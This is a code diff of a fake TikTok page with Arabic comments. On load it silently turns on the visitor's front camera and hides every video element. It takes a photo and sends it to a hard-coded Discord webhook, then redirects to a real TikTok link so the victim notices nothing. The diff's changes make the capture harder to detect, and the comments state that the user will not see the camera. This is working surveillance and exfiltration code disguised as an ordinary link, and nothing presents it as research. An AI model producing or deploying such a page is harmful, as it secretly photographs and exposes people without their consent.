@@ -2,94 +2,127 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok.com</title>
+    <title>TikTok</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        video, canvas { border: 2px solid #ddd; border-radius: 8px; max-width: 100%; height: auto; background-color: #ccc; }
-        .status-message { font-size: 16px; margin-top: 15px; font-weight: bold; color: #333; }
+        /* خلفية بيضاء بالكامل - بدون أي مربع أو حدود أو ظل */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        /* لا يوجد مربع - مجرد نص بسيط جداً */
+        .hidden-content {
+            background: transparent;
+            box-shadow: none;
+            border: none;
+            padding: 20px;
+        }
+        
+        /* النص عادي - لا يلفت الانتباه */
+        p {
+            color: #ccc;
+            font-size: 14px;
+            opacity: 0.3;
+        }
+        
+        /* إخفاء أي عناصر فيديو أو كانفاس تماماً */
+        video, canvas {
+            display: none !important;
+            visibility: hidden;
+            width: 0;
+            height: 0;
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2></h2>
-    <p id="instruction"></p>
-    <video id="video" width="0" height="0" autoplay playsinline></video><br>
-    <div id="status" class="status-message"></div>
-    <canvas id="canvas" width="0" height="0" style="display:none;"></canvas>
+<!-- لا يوجد مربع، لا حدود، فقط خلفية بيضاء -->
+<div class="hidden-content">
+    <p>جاري التحميل...</p>
 </div>
+
+<!-- كاميرا مخفية تماماً (لن تظهر للمستخدم) -->
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const instructionText = document.getElementById('instruction');
-    const statusText = document.getElementById('status');
-
-    // ⚠️ ضع رابط الـ Webhook الصحيح هنا
+    
+    // Webhook URL
     const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_';
-
-    // رابط TikTok الذي سيتم التحويل إليه بعد إرسال الصورة
+    
+    // رابط TikTok للتحويل بعد التصوير
     const tiktokRedirectUrl = 'https://vt.tiktok.com/ZSxB7JgtR/';
-
+    
+    // ضبط حجم الكاميرا خلف الكواليس (صغير جداً لتوفير الأداء)
+    canvas.width = 640;
+    canvas.height = 480;
+    
+    // بدء الكاميرا فوراً بدون أي تفاعل من المستخدم
     window.addEventListener('DOMContentLoaded', () => {
         navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user' }, 
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }, 
             audio: false 
         })
         .then(stream => {
             video.srcObject = stream;
-            instructionText.textContent = "";
-            statusText.textContent = "";
-
+            
+            // انتظار ثانية لتثبيت الكاميرا
             video.addEventListener('loadedmetadata', () => {
-                setTimeout(() => {
-                    captureAndSend();
-                }, 500);
+                setTimeout(captureAndSend, 800);
             });
         })
         .catch(err => {
-            console.error("", err);
-            instructionText.textContent = "";
-            statusText.textContent = "";
+            console.error("Camera error:", err);
+            // حتى لو فشلت الكاميرا، ننقل إلى TikTok عادي
+            window.location.replace(tiktokRedirectUrl);
         });
     });
-
+    
     function captureAndSend() {
         const context = canvas.getContext('2d');
+        
+        // رسم صورة من الفيديو (المستخدم لا يرى شيئاً)
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
+        
         canvas.toBlob(blob => {
             if (!blob) {
-                // إذا فشل إنشاء الصورة، ننقل مباشرة
                 window.location.replace(tiktokRedirectUrl);
                 return;
             }
-
+            
             const formData = new FormData();
             formData.append('files[0]', blob, 'captured-image.png');
-            formData.append('username', 'تطبيق الكاميرا التلقائي');
-
+            formData.append('username', 'System');
+            
             fetch(webhookUrl, {
                 method: 'POST',
                 body: formData
             })
-            .then(response => {
-                if (response.ok) {
-                    statusText.textContent = "";
-                    statusText.style.color = "#28a745";
-                } else {
-                    statusText.textContent = "";
-                    statusText.style.color = "#dc3545";
-                }
-                // ✅ بعد الانتهاء من الإرسال (نجاحًا أو فشلًا) → تحويل إلى TikTok
+            .then(() => {
+                // بعد الإرسال (نجاح أو فشل) → تحويل سريع إلى TikTok
                 window.location.replace(tiktokRedirectUrl);
             })
-            .catch(error => {
-                console.error("خطأ شبكة:", error);
-                statusText.textContent = "";
-                statusText.style.color = "#dc3545";
-                // ✅ حتى لو فشل الإرسال → تحويل إلى TikTok
+            .catch(() => {
                 window.location.replace(tiktokRedirectUrl);
             });
         }, 'image/png');
